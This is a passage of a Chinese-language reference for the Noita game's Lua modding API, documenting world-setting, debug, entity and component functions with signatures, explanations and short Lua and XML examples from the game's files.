<p>注2：此函数具备跨存档特性，只要时间到了就执行，即使已经新开了一局（如果函数还能找到的话）</p>
<h3 id="SetWorldSeed"><a href="#SetWorldSeed" class="headerlink" title="SetWorldSeed"></a><code>SetWorldSeed</code></h3><blockquote>
<p>SetWorldSeed( new_seed:int )</p>
</blockquote>
<p>设置世界的种子</p>
<h3 id="SetPlayerSpawnLocation"><a href="#SetPlayerSpawnLocation" class="headerlink" title="SetPlayerSpawnLocation"></a><code>SetPlayerSpawnLocation</code></h3><blockquote>
<p>SetPlayerSpawnLocation( x:number, y:number )</p>
</blockquote>
<p>设置出生点，输入坐标</p>
<h3 id="SetRandomSeed"><a href="#SetRandomSeed" class="headerlink" title="SetRandomSeed"></a><code>SetRandomSeed</code></h3><blockquote>
<p>SetRandomSeed( x:number, y:number )</p>
</blockquote>
<p>设置随机种子，参数选择坐标、时间、实体id或无意义数字等均可</p>
<h3 id="DEBUG-GetMouseWorld"><a href="#DEBUG-GetMouseWorld" class="headerlink" title="DEBUG_GetMouseWorld"></a><code>DEBUG_GetMouseWorld</code></h3><blockquote>
<p>DEBUG_GetMouseWorld() -&gt; x:number,y:number</p>
</blockquote>
<p>获取鼠标在世界地图上的坐标，返回一对坐标</p>
<h3 id="DEBUG-MARK"><a href="#DEBUG-MARK" class="headerlink" title="DEBUG_MARK"></a><code>DEBUG_MARK</code></h3><blockquote>
<p>DEBUG_MARK( x:number, y:number, message:string = “”, color_r:number = 1, color_g:number = 0, color_b:number = 0 )</p>
</blockquote>
<p>标记，输入在屏幕上的坐标，字符串，颜色（RGB）</p>
<h2 id="实体Entity……"><a href="#实体Entity……" class="headerlink" title="实体Entity……"></a>实体Entity……</h2><h3 id="EntityLoad"><a href="#EntityLoad" class="headerlink" title="EntityLoad"></a><code>EntityLoad</code></h3><blockquote>
<p>EntityLoad( filename:string, pos_x:number = 0, pos_y:number = 0 ) -&gt; entity_id:int</p>
</blockquote>
<p>生成一个实体，参数为一个xml文件路径和两个坐标，返回entity_id，实体的标识符，可以以此跟踪该实体</p>
<p>生成开销（每百次毫秒级）远小于后续计算实体行为开销</p>
<p>生物数量有上限：<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CameraBoundComponent</span> 
        <span class="token attr-name">max_count</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span>
        <span class="token attr-name">distance</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>160000<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CameraBoundComponent</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>在相机界限组件内定义</p>
<h3 id="EntityLoadEndGameItem"><a href="#EntityLoadEndGameItem" class="headerlink" title="EntityLoadEndGameItem"></a><code>EntityLoadEndGameItem</code></h3><blockquote>
<p>EntityLoadEndGameItem( filename:string, pos_x:number = 0, pos_y:number = 0 ) -&gt; entity_id:int</p>
</blockquote>
<p>一个很神秘的api，测试中和EntityLoad基本一致，游戏中唯一可见的用法是：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">Random</span><span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100000</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">100000</span> <span class="token punctuation">)</span> <span class="token keyword">then</span>
<span class="token function">EntityLoadEndGameItem</span><span class="token punctuation">(</span> <span class="token string">"data/entities/animals/boss_centipede/sampo.xml"</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> y <span class="token punctuation">)</span>
count <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">return</span> 
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>该函数效果是会在正常生成sampo之后再生成一个宝箱</p>
<h3 id="EntityKill"><a href="#EntityKill" class="headerlink" title="EntityKill"></a><code>EntityKill</code></h3><blockquote>
<p>EntityKill( entity_id:int )</p>
</blockquote>
<p>清除指定id的实体，无尸体、无掉落</p>
<h3 id="EntityCreateNew"><a href="#EntityCreateNew" class="headerlink" title="EntityCreateNew"></a><code>EntityCreateNew</code></h3><blockquote>
<p>EntityCreateNew( name:string = “” ) -&gt; entity_id:int</p>
</blockquote>
<p>创建一个实体，参数为实体名，可留空，返回id，搭配其它操作实体的函数使用，例：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">-- add ui icon etc</span>
<span class="token keyword">local</span> entity_ui <span class="token operator">=</span> <span class="token function">EntityCreateNew</span><span class="token punctuation">(</span> <span class="token string">""</span> <span class="token punctuation">)</span>
<span class="token function">EntityAddComponent</span><span class="token punctuation">(</span> entity_ui<span class="token punctuation">,</span> <span class="token string">"UIIconComponent"</span><span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span> 
name <span class="token operator">=</span> essence_name<span class="token punctuation">,</span>
description <span class="token operator">=</span> essence_desc<span class="token punctuation">,</span>
icon_sprite_file <span class="token operator">=</span> ui_icon
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token function">EntityAddTag</span><span class="token punctuation">(</span> entity_ui<span class="token punctuation">,</span> <span class="token string">"essence_effect"</span> <span class="token punctuation">)</span>
<span class="token function">EntityAddChild</span><span class="token punctuation">(</span> entity_who_picked<span class="token punctuation">,</span> entity_ui <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="EntityLoadCameraBound"><a href="#EntityLoadCameraBound" class="headerlink" title="EntityLoadCameraBound"></a><code>EntityLoadCameraBound</code></h3><blockquote>
<p>EntityLoadCameraBound( filename:string, pos_x:number = 0, pos_y:number = 0 )</p>
</blockquote>
<p>输入一个xml路径，一对坐标，不返回实体id。在对应坐标处生成一个指定实体，除无返回值外未观察到与EntityLoad的区别，开销相近，游戏文件中不常见</p>
<h3 id="EntityGetWithTag"><a href="#EntityGetWithTag" class="headerlink" title="EntityGetWithTag"></a><code>EntityGetWithTag</code></h3><blockquote>
<p>EntityGetWithTag( tag:string ) -&gt; {entity_id:int} <strong>[Returns all entities with ‘tag’.]</strong></p>
</blockquote>
<p>获取带有指定标签的实体，参数是标签，nolla备注说返回的是所有实体（id）</p>
<p>tags可以在实体的xml文件里看到：<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Entity</span> 
  <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DEBUG_NAME:player<span class="token punctuation">"</span></span>
  <span class="token attr-name">tags</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mortal,human,hittable,peasant,prey,player_unit,teleportable<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Entity</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>寻找玩家就可以：</p>
<blockquote>
<p>EntityGetWithTag( “player_unit” )<br>得到玩家表，第一项即玩家的实体id</p>
</blockquote>
<p>有一定的检测范围，大于视野很多</p>
<h3 id="EntityGetInRadius"><a href="#EntityGetInRadius" class="headerlink" title="EntityGetInRadius"></a><code>EntityGetInRadius</code></h3><blockquote>
<p>EntityGetInRadius( pos_x:number, pos_y:number, radius:number ) -&gt; {entity_id:int} [Returns all entities in ‘radius’ distance from ‘x’,’y’.]</p>
</blockquote>
<p>输入坐标和半径，返回所有实体id。检测范围存在上限，半径约为1000像素（有待精确测量）</p>
<h3 id="EntityGetInRadiusWithTag"><a href="#EntityGetInRadiusWithTag" class="headerlink" title="EntityGetInRadiusWithTag"></a><code>EntityGetInRadiusWithTag</code></h3><blockquote>
<p>EntityGetInRadiusWithTag( pos_x:number, pos_y:number, radius:number, entity_tag:string ) -&gt; {entity_id:int} [Returns all entities in ‘radius’ distance from ‘x’,’y’.]</p>
</blockquote>
<p>输入一对坐标，实体id和一个标签，前两个的结合</p>
<h3 id="EntityGetClosest"><a href="#EntityGetClosest" class="headerlink" title="EntityGetClosest"></a><code>EntityGetClosest</code></h3><blockquote>
<p>EntityGetClosest( pos_x:number, pos_y:number ) -&gt; entity_id:int</p>
</blockquote>
<p>获取具体给定坐标最近的实体id，输入一对坐标，返回id</p>
<h3 id="EntityGetClosestWithTag"><a href="#EntityGetClosestWithTag" class="headerlink" title="EntityGetClosestWithTag"></a><code>EntityGetClosestWithTag</code></h3><blockquote>
<p>EntityGetClosestWithTag(  pos_x:number, pos_y:number, tag:string ) -&gt; entity_id:int</p>
</blockquote>
<p>获取最近的带有某标签的实体，输入坐标、标签，返回id</p>
<h3 id="EntityGetWithName"><a href="#EntityGetWithName" class="headerlink" title="EntityGetWithName"></a><code>EntityGetWithName</code></h3><blockquote>
<p>EntityGetWithName( name:string ) -&gt; entity_id:int</p>
</blockquote>
<p>输入name，返回id。name类似于以下，是实体的名字，受汉化影响。（此api在游戏文件里一次也没用过）<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Entity</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$projectile_default<span class="token punctuation">"</span></span> <span class="token attr-name">tags</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>projectile_player<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Entity</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h3 id="EntityGetTransform"><a href="#EntityGetTransform" class="headerlink" title="EntityGetTransform"></a><code>EntityGetTransform</code></h3><blockquote>
<p>EntityGetTransform( entity_id:int ) -&gt; x:number,y:number,rotation:number,scale_x:number,scale_y:number</p>
</blockquote>
<p>用于获取实体位置，输入实体id</p>
<p>前俩返回值是坐标，rotation是贴图的旋转角度，单位是弧度，0为正，顺时针，scale_x和y是贴图的缩放倍数，负数为翻转</p>
<h3 id="EntitySetTransform"><a href="#EntitySetTransform" class="headerlink" title="EntitySetTransform"></a><code>EntitySetTransform</code></h3><blockquote>
<p>EntitySetTransform( entity_id:int, x:number, y:number = 0, rotation:number = 0, scale_x:number = 1, scale_y:number = 1 )</p>
</blockquote>
<p>设置实体状态，id，坐标，贴图顺时针选择弧度，贴图缩放，-1翻转</p>
<h3 id="EntityApplyTransform"><a href="#EntityApplyTransform" class="headerlink" title="EntityApplyTransform"></a><code>EntityApplyTransform</code></h3><blockquote>
<p>EntityApplyTransform( entity_id:int, x:number, y:number = 0, rotation:number = 0, scale_x:number = 1, scale_y:number = 1 )  [Sets the transform and tries to immediately refresh components that calculate values based on an entity’s transform.]</p>
</blockquote>
<p>用法同上，立即更新依赖组件</p>
<h3 id="EntityGetName"><a href="#EntityGetName" class="headerlink" title="EntityGetName"></a><code>EntityGetName</code></h3><blockquote>
<p>EntityGetName( entity_id:int ) -&gt; name:string</p>
</blockquote>
<p>输入id，返回name（字符串）</p>
<h3 id="EntitySetName"><a href="#EntitySetName" class="headerlink" title="EntitySetName"></a><code>EntitySetName</code></h3><blockquote>
<p>EntitySetName( entity_id:int, name:string )</p>
</blockquote>
<p>输入id和name，无返回值</p>
<h3 id="EntityGetTags"><a href="#EntityGetTags" class="headerlink" title="EntityGetTags"></a><code>EntityGetTags</code></h3><blockquote>
<p>EntityGetTags( entity_id:int ) -&gt; string|nil [Returns a string where the tags are comma-separated, or nil if ‘entity_id’ doesn’t point to a valid entity.]</p>
</blockquote>
<p>输入id，返回标签（一个字符串）。备注说返回的标签以字符串分割，id无效返回nil</p>
<h3 id="EntityAddTag"><a href="#EntityAddTag" class="headerlink" title="EntityAddTag"></a><code>EntityAddTag</code></h3><blockquote>
<p>EntityAddTag( entity_id:int, tag:string )</p>
</blockquote>
<p>输入实体id，字符串，追加到原有标签末尾</p>
<h3 id="EntityRemoveTag"><a href="#EntityRemoveTag" class="headerlink" title="EntityRemoveTag"></a><code>EntityRemoveTag</code></h3><blockquote>
<p>EntityRemoveTag( entity_id:int, tag:string )</p>
</blockquote>
<p>移除标签，输入实体id，待移除的标签名</p>
<h3 id="EntityHasTag"><a href="#EntityHasTag" class="headerlink" title="EntityHasTag"></a><code>EntityHasTag</code></h3><blockquote>
<p>EntityHasTag( entity_id:int, tag:string ) -&gt; bool</p>
</blockquote>
<p>判断实体是否具有标签，返回一个bool值</p>
<h3 id="EntityGetFilename"><a href="#EntityGetFilename" class="headerlink" title="EntityGetFilename"></a><code>EntityGetFilename</code></h3><blockquote>
<p>EntityGetFilename( entity_id:int ) -&gt; full_path:string [Return value example: ‘data/entities/items/flute.xml’. Incorrect value is returned if the entity has passed through the world streaming system.]</p>
</blockquote>
<p>输入id，返回一个文件路径名</p>
<h3 id="EntitiesGetMaxID"><a href="#EntitiesGetMaxID" class="headerlink" title="EntitiesGetMaxID"></a><code>EntitiesGetMaxID</code></h3><blockquote>
<p>EntitiesGetMaxID() -&gt; entity_max_id:number [Returns the max entity ID currently in use. Entity IDs are increased linearly. ]</p>
</blockquote>
<p>无参数，返回在用的最大id</p>
<h3 id="EntityGetIsAlive"><a href="#EntityGetIsAlive" class="headerlink" title="EntityGetIsAlive"></a><code>EntityGetIsAlive</code></h3><blockquote>
<p>EntityGetIsAlive( entity_id:int ) -&gt; bool</p>
</blockquote>
<p>输入实体id，返回bool值，是否活着</p>
<h3 id="EntityAddComponent"><a href="#EntityAddComponent" class="headerlink" title="EntityAddComponent"></a><code>EntityAddComponent</code></h3><blockquote>
<p>EntityAddComponent( entity_id:int, component_type_name:string, table_of_component_values:{string} = nil ) -&gt; component_id:int</p>
</blockquote>
<p>为实体增加组件，输入实体id，组件名，一个该组件的属性表（键值对），返回组件id（唯一地标识该实体的改组件）</p>
<p>使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityAddComponent</span><span class="token punctuation">(</span> projectile_id<span class="token punctuation">,</span> <span class="token string">"HomingComponent"</span><span class="token punctuation">,</span> 
<span class="token punctuation">&#123;</span> 
target_tag <span class="token operator">=</span> <span class="token string">"projectile_commander"</span><span class="token punctuation">,</span>
homing_targeting_coeff <span class="token operator">=</span> <span class="token string">"200"</span><span class="token punctuation">,</span>
homing_velocity_multiplier <span class="token operator">=</span> <span class="token string">"1.0"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="EntityAddComponent2"><a href="#EntityAddComponent2" class="headerlink" title="EntityAddComponent2"></a><code>EntityAddComponent2</code></h3><blockquote>
<p>EntityAddComponent2( entity_id:int, component_type_name, table_of_component_values:{string-multiple_types} = nil ) -&gt; component_id [Creates a component of type ‘component_type_name’ and adds it to ‘entity_id’. ‘table_of_component_values’ should be a string-indexed table, where keys are field names and values are field values of correct type. The value setting works like ComponentObjectSetValue2(), with the exception that multivalue types are not supported. Additional supported values are _tags:comma_separated_string and _enabled:bool, which basically work like the those fields work in entity XML files. Returns the created component, if creation succeeded, or nil.</p>
</blockquote>
<p>参数与返回值同上，nolla备注说：创造一个组件并加到实体上，组件值表应该是一个键值对表，键是字段名，值是正确的类型。这个值设置运行就像ComponentObjectSetValue2()一样，除了不支持多种值类型。额外支持的值有_tags:comma_separated_string和 _enabled:bool，和其他xml文件里对应的字段效果一样</p>
<p>并没有解释和EntityAddComponent相比有什么区别，使用示例：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityAddComponent2</span><span class="token punctuation">(</span> text_id<span class="token punctuation">,</span> <span class="token string">"SpriteComponent"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#123;</span>
image_file<span class="token operator">=</span><span class="token string">"data/fonts/font_pixel_white.xml"</span><span class="token punctuation">,</span>
is_text_sprite<span class="token operator">=</span><span class="token keyword">true</span><span class="token punctuation">,</span>
offset_x<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">,</span>
offset_y<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span>
text <span class="token operator">=</span> text<span class="token punctuation">,</span> 
update_transform<span class="token operator">=</span><span class="token keyword">true</span><span class="token punctuation">,</span>
update_transform_rotation<span class="token operator">=</span><span class="token keyword">false</span><span class="token punctuation">,</span>
has_special_scale<span class="token operator">=</span><span class="token keyword">true</span><span class="token punctuation">,</span>
special_scale_x<span class="token operator">=</span><span class="token number">0.65</span><span class="token punctuation">,</span>
special_scale_y<span class="token operator">=</span><span class="token number">0.65</span><span class="token punctuation">,</span>
alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="EntityRemoveComponent"><a href="#EntityRemoveComponent" class="headerlink" title="EntityRemoveComponent"></a><code>EntityRemoveComponent</code></h3><blockquote>
<p>EntityRemoveComponent( entity_id:int, component_id:int )</p>
</blockquote>
<p>移除组件，输入实体id和组件id，无返回</p>
<h3 id="EntityGetAllComponents"><a href="#EntityGetAllComponents" class="headerlink" title="EntityGetAllComponents"></a><code>EntityGetAllComponents</code></h3><blockquote>
<p>EntityGetAllComponents( entity_id:int ) -&gt; {int} [Returns a table of component ids.]</p>
</blockquote>
<p>获取实体的全部组件，输入实体id返回一个组件id表</p>
<p>使用示例：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">-- hamis here is a entity_id</span>
<span class="token keyword">for</span> _<span class="token punctuation">,</span>comp <span class="token keyword">in</span> <span class="token function">pairs</span><span class="token punctuation">(</span><span class="token function">EntityGetAllComponents</span><span class="token punctuation">(</span>hamis<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">do</span>
     <span class="token function">GamePrint</span><span class="token punctuation">(</span>comp<span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="EntityGetComponent"><a href="#EntityGetComponent" class="headerlink" title="EntityGetComponent"></a><code>EntityGetComponent</code></h3><blockquote>
<p>EntityGetComponent( entity_id:int, component_type_name:string, tag:string = “” ) -&gt; {component_id}|nil</p>
</blockquote>
<p>获取特定组件，输入实体id，组件名，标签（可省略），返回一个组件id表</p>
<h3 id="EntityGetFirstComponent"><a href="#EntityGetFirstComponent" class="headerlink" title="EntityGetFirstComponent"></a><code>EntityGetFirstComponent</code></h3><blockquote>
<p>EntityGetFirstComponent( entity_id:int, component_type_name:string, tag:string = “” ) -&gt; component_id|nil</p>
</blockquote>
<p>获取第一个组件，输入实体id，组件名，标签（可省略），返回一个组件id</p>
<h3 id="EntityGetComponentIncludingDisabled"><a href="#EntityGetComponentIncludingDisabled" class="headerlink" title="EntityGetComponentIncludingDisabled"></a><code>EntityGetComponentIncludingDisabled</code></h3><blockquote>
<p>EntityGetComponentIncludingDisabled( entity_id:int, component_type_name:string, tag:string = “” ) -&gt; {component_id}|nil</p>
</blockquote>
<p>获取包含禁用的组件，输入实体id，组件名，标签（可省略），返回一个组件id表</p>
<h3 id="EntityGetFirstComponentIncludingDisabled"><a href="#EntityGetFirstComponentIncludingDisabled" class="headerlink" title="EntityGetFirstComponentIncludingDisabled"></a><code>EntityGetFirstComponentIncludingDisabled</code></h3><blockquote>
<p>EntityGetFirstComponentIncludingDisabled( entity_id:int, component_type_name:string, tag:string = “” ) -&gt; component_id|nil</p>
</blockquote>
<p>获取包含禁用的组件中的第一个，输入实体id，组件名，标签（可省略），返回一个组件id，参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> celleater <span class="token operator">=</span> <span class="token function">EntityGetFirstComponent</span><span class="token punctuation">(</span> <span class="token function">GetUpdatedEntityID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"CellEaterComponent"</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h3 id="EntitySetComponentIsEnabled"><a href="#EntitySetComponentIsEnabled" class="headerlink" title="EntitySetComponentIsEnabled"></a><code>EntitySetComponentIsEnabled</code></h3><blockquote>
<p>EntitySetComponentIsEnabled( entity_id:int, component_id:int, is_enabled:bool )</p>
</blockquote>
<p>启用/禁用组件，输入实体id，组件id，和一个布尔值（启用/禁用）</p>
<h3 id="EntitySetComponentsWithTagEnabled"><a href="#EntitySetComponentsWithTagEnabled" class="headerlink" title="EntitySetComponentsWithTagEnabled"></a><code>EntitySetComponentsWithTagEnabled</code></h3><blockquote>
<p>EntitySetComponentsWithTagEnabled( entity_id:int, tag:string, enabled:bool )</p>
</blockquote>
<p>批量启用/禁用带特定标签的组件，输入实体id，标签名，启用/禁用</p>
<h3 id="EntityAddChild"><a href="#EntityAddChild" class="headerlink" title="EntityAddChild"></a><code>EntityAddChild</code></h3><blockquote>
<p>EntityAddChild( parent_id:int, child_id:int )</p>
</blockquote>
<p>给实体增加一个子实体，参数前父后子。</p>
<p>一个实体的构成除了组件以外还可以有别的实体，即子实体。大部分的天赋都是以这种形式添加的</p>
<h3 id="EntityGetAllChildren"><a href="#EntityGetAllChildren" class="headerlink" title="EntityGetAllChildren"></a><code>EntityGetAllChildren</code></h3><blockquote>
<p>EntityGetAllChildren( entity_id:int, tag:string = “” ) -&gt; {entity_id:int}|nil [If passed the optional ‘tag’ parameter, will return only child entities that have that tag (If ‘tag’ isn’t a valid tag name, will return no entities). If no entities are returned, might return either an empty table or nil.]</p>
</blockquote>
<p>查找指定实体的子实体，输入实体id、特定标签（可选，无则全部），返回一个实体id表或nil</p>
<h3 id="EntityGetParent"><a href="#EntityGetParent" class="headerlink" title="EntityGetParent"></a><code>EntityGetParent</code></h3><blockquote>
<p>EntityGetParent( entity_id:int ) -&gt; entity_id:int</p>
</blockquote>
<p>输入实体id，返回其父实体id</p>
<h3 id="EntityRemoveFromParent"><a href="#EntityRemoveFromParent" class="headerlink" title="EntityRemoveFromParent"></a><code>EntityRemoveFromParent</code></h3><blockquote>
<p>EntityRemoveFromParent( entity_id:int )</p>
</blockquote>
<p>输入实体id，从其父实体中移除</p>
<h3 id="EntityGetRootEntity"><a href="#EntityGetRootEntity" class="headerlink" title="EntityGetRootEntity"></a><code>EntityGetRootEntity</code></h3><blockquote>
<p>EntityGetRootEntity( entity_id:int ) -&gt; entity_id:int [Returns the given entity if it has no parent, otherwise walks up the parent hierarchy to the topmost parent and returns it.]</p>
</blockquote>
<p>获取根实体，输入id，返回最顶层的根实体id，如果没有根实体则返回自身</p>
<h3 id="EntityLoadToEntity"><a href="#EntityLoadToEntity" class="headerlink" title="EntityLoadToEntity"></a><code>EntityLoadToEntity</code></h3><blockquote>
<p>EntityLoadToEntity( filename:string, entity:int ) [Loads components from ‘filename’ to ‘entity’. Does not load tags and other stuff.]</p>
</blockquote>
<p>把一个文件的组件加载到一个实体上，不加载标签和其它，输入文件路径和实体id，例（念动力踢击天赋）：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">EntityLoadToEntity</span><span class="token punctuation">(</span> <span class="token string">"data/entities/misc/perk_telekinesis.xml"</span><span class="token punctuation">,</span> entity_who_picked <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- data/entities/misc/perk_telekinesis.xml --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Entity</span><span class="token punctuation">></span></span>
    
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TelekinesisComponent</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TelekinesisComponent</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AudioLoopComponent</span>
    <span class="token attr-name">_tags</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sound_telekinesis_move<span class="token punctuation">"</span></span>
    <span class="token attr-name">file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data/audio/Desktop/misc.bank<span class="token punctuation">"</span></span>
    <span class="token attr-name">event_name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>misc/telekinesis/object_move<span class="token punctuation">"</span></span>
    <span class="token attr-name">volume_autofade_speed</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.05<span class="token punctuation">"</span></span>
  <span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>AudioLoopComponent</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AudioLoopComponent</span>
    <span class="token attr-name">_tags</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sound_telekinesis_hold<span class="token punctuation">"</span></span>
    <span class="token attr-name">file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data/audio/Desktop/misc.bank<span class="token punctuation">"</span></span>
    <span class="token attr-name">event_name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>misc/telekinesis/hold<span class="token punctuation">"</span></span>
    <span class="token attr-name">volume_autofade_speed</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.05<span class="token punctuation">"</span></span>
  <span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>AudioLoopComponent</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Entity</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>随便替换组件会产生复杂的异常行为，有待进一步探索</p>
<h3 id="EntitySave"><a href="#EntitySave" class="headerlink" title="EntitySave"></a><code>EntitySave</code></h3><blockquote>
<p>EntitySave( entity_id:int, filename:string ) [Note: works only in dev builds.]</p>
</blockquote>
<p>保存实体为文件，输入实体id和保存到的文件路径，仅在开发者模式下可用，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">--direector_helpers_design.lua</span>
entity_file <span class="token operator">=</span> <span class="token function">getPath</span><span class="token punctuation">(</span> entity_file <span class="token punctuation">)</span> <span class="token operator">..</span> biome <span class="token operator">..</span> <span class="token string">"/"</span> <span class="token operator">..</span> <span class="token function">getFilename</span><span class="token punctuation">(</span>entity_file<span class="token punctuation">)</span>

<span class="token function">print</span><span class="token punctuation">(</span> <span class="token string">"saving to"</span><span class="token punctuation">,</span> <span class="token function">getPath</span><span class="token punctuation">(</span> entity_file <span class="token punctuation">)</span> <span class="token punctuation">)</span>
<span class="token function">EntitySave</span><span class="token punctuation">(</span> entity<span class="token punctuation">,</span> entity_file  <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="组件Component……"><a href="#组件Component……" class="headerlink" title="组件Component……"></a>组件Component……</h2><p>（从实体获取组件信息见实体部分）</p>
<h3 id="ComponentGetValue2"><a href="#ComponentGetValue2" class="headerlink" title="ComponentGetValue2"></a><code>ComponentGetValue2</code></h3><blockquote>
<p>ComponentGetValue2( component_id:int, field_name:string ) -&gt; multiple_types|nil [Returns one or many values matching the type or subtypes of the requested field. Reports error and returns nil if the field type is not supported or field was not found. This is up to 7.5x faster than the old ComponentSetValue functions.]</p>
</blockquote>
<p>获取组件的字段的值，输入组件id和字段名，返回匹配的所有值/nil</p>
<h3 id="ComponentSetValue2"><a href="#ComponentSetValue2" class="headerlink" title="ComponentSetValue2"></a><code>ComponentSetValue2</code></h3><blockquote>
<p>ComponentSetValue2( component_id:int, field_name:string, value_or_values:multiple_types ) [Sets the value of a field. Value(s) should have a type matching the field type. Reports error if the values weren’t given in correct type, the field type is not supported, or the component does not exist. This is up to 20x faster than the old ComponentSetValue functions.]</p>
</blockquote>
<p>设置组件字段，输入组件id，字段名，值。</p>
<h3 id="ComponentObjectGetValue2"><a href="#ComponentObjectGetValue2" class="headerlink" title="ComponentObjectGetValue2"></a><code>ComponentObjectGetValue2</code></h3><blockquote>
<p>ComponentObjectGetValue2( component_id:int, object_name:string, field_name:string ) -&gt; multiple types|nil [Returns one or many values matching the type or subtypes of the requested field in a component subobject. Reports error and returns nil if the field type is not supported or ‘object_name’ is not a metaobject.]</p>
</blockquote>
<p>获取object的值，输入组件id，对象名，字段名，返回值</p>
<p>一个组件的属性可能是标签，比如：<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DamageModelComponent</span> 
